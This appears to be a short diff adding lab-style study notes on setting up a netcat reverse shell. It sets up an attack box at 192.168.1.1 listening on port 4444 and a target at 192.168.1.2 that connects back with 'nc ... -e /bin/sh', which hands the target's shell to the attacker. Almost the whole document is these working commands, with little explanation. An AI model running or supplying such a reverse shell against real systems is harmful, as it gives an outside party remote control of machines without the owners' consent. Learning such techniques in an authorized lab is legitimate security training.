@@ -1,0 +1,15 @@
+Netcat Reverse Shell
+
+Attackbox
+192.168.1.1
+
+nc -lvp 4444 (listening verbose port)
+
+Listening
+
+target
+192.168.1.2
+
+nc 192.168.1.1 4444 -e /bin/sh
+
+Connecting
